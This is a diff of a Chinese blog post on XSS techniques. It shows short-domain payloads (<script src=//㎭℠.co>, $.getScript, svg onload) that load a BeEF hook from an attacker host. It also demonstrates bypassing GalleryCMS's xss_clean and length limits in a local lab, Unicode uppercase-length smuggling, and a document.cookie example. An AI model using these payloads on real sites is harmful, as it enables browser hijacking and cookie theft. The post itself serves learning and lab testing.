+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png" alt="image-20220911004816278"></p>
+<p>此时我们的极限 payload 为 <code>&lt;script/src=//㎭℠.㎺&gt;</code></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png" alt="image-20220911005113131"></p>
+<p>此时我们可以在 19 个长度内完成</p>
+<h5 id="2前端框架为jquery可以使用如下payload"><a class="markdownIt-Anchor" href="#2前端框架为jquery可以使用如下payload">#</a> 2 前端框架为 jQuery，可以使用如下 payload：</h5>
+<p>不过滤 script 标签：</p>
+<p>注意此 payload 不能缺少 &quot;&quot; ，同样需要把 hook.js 放到 index.html 中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-![image-20220911194433247](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png)
-
-过滤script标签
-
-如果没有过滤svg标签。那么此时的payload为：
-
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png" alt="image-20220911194433247"></p>
+<p>过滤 script 标签</p>
+<p>如果没有过滤 svg 标签。那么此时的 payload 为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>
-
-![image-20220911195539757](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png)
-
-
-
-
-
-##### 3.绕过GalleryCMS
-
-对于用户的输入，gallerycms做了严格的过滤，包括 从长度和内容限制
-
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png" alt="image-20220911195539757"></p>
+<h5 id="3绕过gallerycms"><a class="markdownIt-Anchor" href="#3绕过gallerycms">#</a> 3. 绕过 GalleryCMS</h5>
+<p>对于用户的输入，gallerycms 做了严格的过滤，包括 从长度和内容限制</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">// Validate form.</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">helper</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">library</span>(<span class="string">&#x27;form_validation&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;form_validation-&gt;<span class="title function_ invoke__">set_error_delimiters</span>(<span class="string">&#x27;&lt;div class=&quot;alert alert-error&quot;&gt;&lt;strong&gt;Error: &lt;/strong&gt;&#x27;</span>, <span class="string">&#x27;&lt;/div&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$user_data</span> = <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">all_userdata</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;form_validation-&gt;<span class="title function_ invoke__">set_rules</span>(<span class="string">&#x27;album_name&#x27;</span>, <span class="string">&#x27;Album Name&#x27;</span>, <span class="string">&#x27;trim|required|max_length[45]|xss_clean&#x27;</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
-
-
-
-###### 假设没有xss_clean的绕过
-
-注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了
-
-比如：我虚拟机的kali的ip是192.168.13.133，我的gallerycms部署在本机上，我在本机上host文件加一个dns解析，将radsm.co解析到192.168.13.133
-
-![image-20220911201545877](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png)
-
-但要是这样我tm白搭了一天的beef...
-
-这样我们的payload就会变长，我使用的端口为18888，访问时就会变成radsm.co:18888
-
-我们做一下减法payload会多出6个字符，到时候能解析的时候我们的payload就可以少六个
-
-
-
-1.payload长度限制为50时
-
+<h6 id="假设没有xss_clean的绕过"><a class="markdownIt-Anchor" href="#假设没有xss_clean的绕过">#</a> 假设没有 xss_clean 的绕过</h6>
+<p>注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了</p>
+<p>比如：我虚拟机的 kali 的 ip 是 192.168.13.133，我的 gallerycms 部署在本机上，我在本机上 host 文件加一个 dns 解析，将 radsm.co 解析到 192.168.13.133</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png" alt="image-20220911201545877"></p>
+<p>但要是这样我 tm 白搭了一天的 beef…</p>
+<p>这样我们的 payload 就会变长，我使用的端口为 18888，<span class="exturl" data-url="aHR0cDovL3huLS1yYWRzbS1ydDJoaTd6b21ydG9tYnBqY3EyaTNzemEuY286MTg4ODg=">访问时就会变成 radsm.co:18888</span></p>
+<p>我们做一下减法 payload 会多出 6 个字符，到时候能解析的时候我们的 payload 就可以少六个</p>
+<p>1.payload 长度限制为 50 时</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.getScript(&quot;//㎭℠.co&quot;)&lt;/script&gt;</span><br><span class="line">payload 中&quot;&quot; 和后半个闭合标签都不能缺少</span><br></pre></td></tr></table></figure>
-
-![image-20220911231941383](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png)
-
-2.payload长度限制为40时
-
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911231941383.png" alt="image-20220911231941383"></p>
+<p>2.payload 长度限制为 40 时</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//㎭℠.co&gt;&#x27;.length</span><br></pre></td></tr></table></figure>
-
-![image-20220911232202908](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png)
-
-
-
-###### 存在xss_clean并且长度限制为45个字符时
-
-利用XSS_clean 漏过滤的svg来绕过
-
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911232202908.png" alt="image-20220911232202908"></p>
+<h6 id="存在xss_clean并且长度限制为45个字符时"><a class="markdownIt-Anchor" href="#存在xss_clean并且长度限制为45个字符时">#</a> 存在 xss_clean 并且长度限制为 45 个字符时</h6>
+<p>利用 XSS_clean 漏过滤的 svg 来绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=$.getScript(&quot;//㎭℠.co&quot;)&gt;</span><br></pre></td></tr></table></figure>
-
-注意：如果此时在index.html内写入hook.js，并且使用宝塔面板，一定记着把bt自己的初始页的东西删光，不然无法上线
-
-并且bt使用自己的默认index.html的，在/www/server/panel下，具体可以去bt看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的index.html的
-
-
-
-还有一件很诡异的事，我gallerycms搭建在本机192.168.2.13上，beef-xss在kali 192.168.13.133上，在一样的payload前提下，在本机上始终无法上线，但在kali上就可以，本机上进行了域名和ip的尝试，始终不行，最后在kali访问本机的gallerycms成功上线
-
-
-
-补充:gallerycms的对新建album的过滤在application/controllers/album.php中，修改长度在这个文件里就能修改前端限制
-
-
-
-+1补充：本篇文件缺少一些xss的基础知识，如果看不懂先看[(49条消息) XSS详解及复现gallerycms字符长度限制短域名绕过_薄荷加冰心有多冷的博客-CSDN博客](https://blog.csdn.net/weixin_44811851/article/details/126080728)
-
-这个大佬写的文章
-
-
-
-
-
-
-
-### 3.通过特殊字符变为大写后长度变为原来两倍偷渡非法字符
-
-https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/
-
-假設我有個字串是 `ßßßßßßßß<b>1</b>`，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 `8*2+8` = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。
-
-在 `mock` 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 `<>` 這些字元進去
-
-### 4.利用SVG/details绕过先抓取元素再赋值
-
-document.querySelector( '.note').innerHTML = text;
-
-
-
-
-
-## 补充：httponly
-
-> 　Cookie分为内存Cookie和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的Cookie，需要获取到用户Cookie+用户浏览器未关闭。如果是硬盘Cookie，则该Cookie是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类Cookie获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。
->
-> 　　Cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。Cookie保存在浏览器的document对象中，对于存在XSS漏洞的网站，入侵者可以插入简单的XSS语句执行任意的JS脚本，以XSS攻击的手段获取网站其余用户的Cookie。
->
-> 比如，举个简单例子：`<script>alert(document.cookie)</script>`
+<p>注意：如果此时在 index.html 内写入 hook.js，并且使用宝塔面板，一定记着把 bt 自己的初始页的东西删光，不然无法上线</p>
+<p>并且 bt 使用自己的默认 index.html 的，在 /www/server/panel 下，具体可以去 bt 看，这个也一定要删掉或者完全改写，否则不会访问你站点首页的自己的 index.html 的</p>
+<p>还有一件很诡异的事，我 gallerycms 搭建在本机 192.168.2.13 上，beef-xss 在 kali 192.168.13.133 上，在一样的 payload 前提下，在本机上始终无法上线，但在 kali 上就可以，本机上进行了域名和 ip 的尝试，始终不行，最后在 kali 访问本机的 gallerycms 成功上线</p>
+<p>补充:gallerycms 的对新建 album 的过滤在 application/controllers/album.php 中，修改长度在这个文件里就能修改前端限制</p>
+<p>+1 补充：本篇文件缺少一些 xss 的基础知识，如果看不懂先看<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgxMTg1MS9hcnRpY2xlL2RldGFpbHMvMTI2MDgwNzI4"> (49 条消息) XSS 详解及复现 gallerycms 字符长度限制短域名绕过_薄荷加冰心有多冷的博客 - CSDN 博客</span></p>
+<p>这个大佬写的文章</p>
+<h3 id="3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符"><a class="markdownIt-Anchor" href="#3通过特殊字符变为大写后长度变为原来两倍偷渡非法字符">#</a> 3. 通过特殊字符变为大写后长度变为原来两倍偷渡非法字符</h3>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmh1bGkudHcvMjAyMi8wMi8wOC93aGF0LWktbGVhcm5lZC1mcm9tLWRpY2VjdGYtMjAyMi8=">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</span></p>
+<p>假設我有個字串是  <code>ßßßßßßßß&lt;b&gt;1&lt;/b&gt;</code> ，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是  <code>8*2+8</code>  = 24 個字，所以 24 個字會全部被寫進去 buf 裡面。</p>
+<p>在  <code>mock</code>  函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡  <code>&lt;&gt;</code>  這些字元進去</p>
+<h3 id="4利用svgdetails绕过先抓取元素再赋值"><a class="markdownIt-Anchor" href="#4利用svgdetails绕过先抓取元素再赋值">#</a> 4. 利用 SVG/details 绕过先抓取元素再赋值</h3>
+<p><code>document.querySelector( '.note').innerHTML = text;</code></p>
+<h2 id="补充httponly"><a class="markdownIt-Anchor" href="#补充httponly">#</a> 补充：httponly</h2>
 <blockquote>
+<p>Cookie 分为内存 Cookie 和硬盘 Cookie，内存 Cookie 储存在浏览器内存中，关闭浏览器则消失。如果是想要利用保存在内存中的 Cookie，需要获取到用户 Cookie + 用户浏览器未关闭。如果是硬盘 Cookie，则该 Cookie 是一段时间有效的（有的时候我们登录网站会出现保持登录状态的选项，即保存在硬盘中），这类 Cookie 获取到后在其有效期内都是可以进行受害者用户身份登录的，进而实现入侵。</p>
+<p>Cookie 由变量名与值组成，其属性里有标准的 cookie 变量，也有用户自定义的属性。Cookie 保存在浏览器的 document 对象中，对于存在 XSS 漏洞的网站，入侵者可以插入简单的 XSS 语句执行任意的 JS 脚本，以 XSS 攻击的手段获取网站其余用户的 Cookie。</p>
+<p>比如，举个简单例子： <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
 <p>Cookie 是通过 http response header 种到浏览器的，设置 Cookie 的语法为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029192451385.png" alt="image-20221029192451385"></p>
@@ -1283,7 +1071,7 @@ document.querySelector( '.note').innerHTML = text;
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2023-03-01 19:12:46" itemprop="dateModified" datetime="2023-03-01T19:12:46+08:00">2023-03-01</time>
+    <time title="Modified: 2023-03-02 20:35:16" itemprop="dateModified" datetime="2023-03-02T20:35:16+08:00">2023-03-02</time>
   </span>
 </div>
 
@@ -1340,7 +1128,7 @@ document.querySelector( '.note').innerHTML = text;
     <div class="item right">
       
 
-  <a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipex2cdtbj20zk0m8x6p.jpg" title="SQL injection">
+  <a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexbei4hj20zk0m8npd.jpg" title="SQL injection">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> web安全</span>
   <h3>SQL injection</h3>
@@ -1362,7 +1150,7 @@ document.querySelector( '.note').innerHTML = text;
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss"><span class="toc-number">1.</span> <span class="toc-text"> XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session-cookie"><span class="toc-number">1.1.</span> <span class="toc-text"> session || cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">1.2.</span> <span class="toc-text"> 1. 反射型 xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">1.3.</span> <span class="toc-text"> 2. 存储型 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%9F%BA%E4%BA%8Edom%E7%9A%84"><span class="toc-number">1.4.</span> <span class="toc-text"> 3. 基于 DOM 的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text"> 浏览器解析机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.1.</span> <span class="toc-text"> HTML 解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.6.</span> <span class="toc-text"> 参考</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss"><span class="toc-number">1.</span> <span class="toc-text"> XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session-cookie"><span class="toc-number">1.1.</span> <span class="toc-text"> session || cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">1.2.</span> <span class="toc-text"> 1. 反射型 xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">1.3.</span> <span class="toc-text"> 2. 存储型 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%9F%BA%E4%BA%8Edom%E7%9A%84"><span class="toc-number">1.4.</span> <span class="toc-text"> 3. 基于 DOM 的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text"> 浏览器解析机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.1.</span> <span class="toc-text"> HTML 解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.2.</span> <span class="toc-text"> URL 解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javascript%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.3.</span> <span class="toc-text"> JavaScript 解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.6.</span> <span class="toc-text"> XSS 攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%AF%BB%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%AF%B9%E8%B1%A1%E5%8F%91%E8%B5%B7cookie%E5%8A%AB%E6%8C%81"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1. 读取浏览器 cookie 对象，发起 cookie 劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%A8%A1%E6%8B%9Fpostget%E8%AF%B7%E6%B1%82%E6%93%8D%E4%BD%9C%E7%94%A8%E6%88%B7%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2. 模拟 POST，GET 请求操作用户的浏览器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3xss%E9%92%93%E9%B1%BC"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 3.XSS 钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 4. 获取用户信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xsslab"><span class="toc-number">1.7.</span> <span class="toc-text"> XSSlab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.8.</span> <span class="toc-text"> 模板字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#httpsxsshaozime"><span class="toc-number">1.9.</span> <span class="toc-text"> https:&#x2F;&#x2F;xss.haozi.me&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prompt1"><span class="toc-number">1.10.</span> <span class="toc-text"> prompt(1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ma-spaghet"><span class="toc-number">1.11.</span> <span class="toc-text"> Ma Spaghet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jefff"><span class="toc-number">1.12.</span> <span class="toc-text"> Jefff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#da-wey"><span class="toc-number">1.13.</span> <span class="toc-text"> da-wey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ricardo"><span class="toc-number">1.14.</span> <span class="toc-text"> ricardo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ah-thats-hawt"><span class="toc-number">1.15.</span> <span class="toc-text"> Ah That’s Hawt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ligma"><span class="toc-number">1.16.</span> <span class="toc-text"> Ligma</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mafia"><span class="toc-number">1.17.</span> <span class="toc-text"> mafia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#area-51"><span class="toc-number">1.18.</span> <span class="toc-text"> Area 51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#okboomer"><span class="toc-number">1.19.</span> <span class="toc-text"> OK，Boomer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ww3"><span class="toc-number">1.20.</span> <span class="toc-text"> WW3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#svg%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6"><span class="toc-number">1.21.</span> <span class="toc-text"> &lt;svg&gt; 深入研究</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dom-clobbering-burp-suite"><span class="toc-number">1.22.</span> <span class="toc-text"> Dom Clobbering - Burp Suite</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lab-exploiting-dom-clobbering-to-enable-xss"><span class="toc-number">1.22.1.</span> <span class="toc-text"> Lab: Exploiting DOM clobbering to enable XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#labclobbering-dom-attributes-to-bypass-html-filters"><span class="toc-number">1.22.2.</span> <span class="toc-text"> Lab:Clobbering DOM attributes to bypass HTML filters</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tui_editor"><span class="toc-number">1.23.</span> <span class="toc-text"> Tui_editor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csp"><span class="toc-number">1.24.</span> <span class="toc-text"> CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#csp%E6%8C%87%E4%BB%A4%E5%80%BC"><span class="toc-number">1.24.1.</span> <span class="toc-text"> CSP 指令值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.25.</span> <span class="toc-text"> 原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93bypass-html-sanitizer"><span class="toc-number">1.25.1.</span> <span class="toc-text"> 通过原型链污染 bypass HTML sanitizer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93bypass-dompurify"><span class="toc-number">1.25.2.</span> <span class="toc-text"> 通过原型链污染 bypass DOMPurify</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctf%E6%A1%88%E4%BE%8B%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.25.3.</span> <span class="toc-text"> CTF 案例：原型链污染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="toc-number">1.26.</span> <span class="toc-text"> 缓存投毒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7"><span class="toc-number">1.27.</span> <span class="toc-text"> 奇技淫巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%80%9A%E8%BF%87%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E6%88%96%E7%BC%A9%E7%9F%ADplayload%E5%92%8Csrc%E9%95%BF%E5%BA%A6"><span class="toc-number">1.27.1.</span> <span class="toc-text"> 1. 通过特殊字符绕过或缩短 playload 和 src 长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%A1%88%E4%BE%8Bemersion-of-xss-with-20-characters-limitation"><span class="toc-number">1.27.2.</span> <span class="toc-text"> 1.1 案例：emersion of XSS with 20 characters limitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1xss-platform"><span class="toc-number">1.27.3.</span> <span class="toc-text"> 1.Xss platform</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11beef-xss"><span class="toc-number">1.27.4.</span> <span class="toc-text"> 1.1beef-xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2xss-hunter"><span class="toc-number">1.27.5.</span> <span class="toc-text"> 2.XSS-hunter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%9C%A8centos%E4%B8%8A%E5%AE%89%E8%A3%85beef-xss"><span class="toc-number">1.27.6.</span> <span class="toc-text"> 2.1 在 centos 上安装 beef-xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E4%BD%BF%E7%94%A84540%E6%88%96%E8%80%8520%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87xss%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.27.7.</span> <span class="toc-text"> 2. 使用 45,40，或者 20 个字符绕过 xss 长度限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21gallerycms%E5%AE%89%E8%A3%85"><span class="toc-number">1.27.8.</span> <span class="toc-text"> 2.1gallerycms 安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22%E4%BD%BF%E7%94%A8%E7%9F%AD%E5%9F%9F%E5%90%8D%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.27.9.</span> <span class="toc-text"> 2.2 使用短域名绕过字符限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E6%B2%A1%E6%9C%89%E7%A6%81%E6%AD%A2script%E6%A0%87%E7%AD%BE%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">1.27.9.0.1.</span> <span class="toc-text"> 1. 没有禁止 script 标签的情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E4%B8%BAjquery%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8Bpayload"><span class="toc-number">1.27.9.0.2.</span> <span class="toc-text"> 2 前端框架为 jQuery，可以使用如下 payload：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E7%BB%95%E8%BF%87gallerycms"><span class="toc-number">1.27.9.0.3.</span> <span class="toc-text"> 3. 绕过 GalleryCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E6%B2%A1%E6%9C%89xss_clean%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.27.9.0.3.1.</span> <span class="toc-text"> 假设没有 xss_clean 的绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8xss_clean%E5%B9%B6%E4%B8%94%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA45%E4%B8%AA%E5%AD%97%E7%AC%A6%E6%97%B6"><span class="toc-number">1.27.9.0.3.2.</span> <span class="toc-text"> 存在 xss_clean 并且长度限制为 45 个字符时</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E9%80%9A%E8%BF%87%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%8F%98%E4%B8%BA%E5%A4%A7%E5%86%99%E5%90%8E%E9%95%BF%E5%BA%A6%E5%8F%98%E4%B8%BA%E5%8E%9F%E6%9D%A5%E4%B8%A4%E5%80%8D%E5%81%B7%E6%B8%A1%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6"><span class="toc-number">1.27.10.</span> <span class="toc-text"> 3. 通过特殊字符变为大写后长度变为原来两倍偷渡非法字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%88%A9%E7%94%A8svgdetails%E7%BB%95%E8%BF%87%E5%85%88%E6%8A%93%E5%8F%96%E5%85%83%E7%B4%A0%E5%86%8D%E8%B5%8B%E5%80%BC"><span class="toc-number">1.27.11.</span> <span class="toc-text"> 4. 利用 SVG&#x2F;details 绕过先抓取元素再赋值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85httponly"><span class="toc-number">1.28.</span> <span class="toc-text"> 补充：httponly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.29.</span> <span class="toc-text"> 参考</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
         <ul>
@@ -1442,57 +1230,10 @@ document.querySelector( '.note').innerHTML = text;
   <li class="item">
     
 <div class="breadcrumb">
-</div>
-
